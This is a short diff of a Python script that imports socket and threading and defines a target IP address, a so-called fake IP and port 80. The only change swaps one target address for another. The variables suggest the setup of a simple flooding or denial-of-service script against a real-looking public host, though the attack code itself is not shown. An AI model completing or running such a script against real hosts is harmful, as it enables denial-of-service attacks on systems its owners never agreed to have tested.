@@ -8,7 +8,7 @@ Created on Tue Mar 31 12:21:58 2020
 import socket
 import threading
 
-target = '89.46.107.22'
+target = '89.46.110.22'
 fake_ip = '153.21.20.35'  #provide no security consistency / you're not hidden 
 port = 80   #ttps port, full list see https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers
 
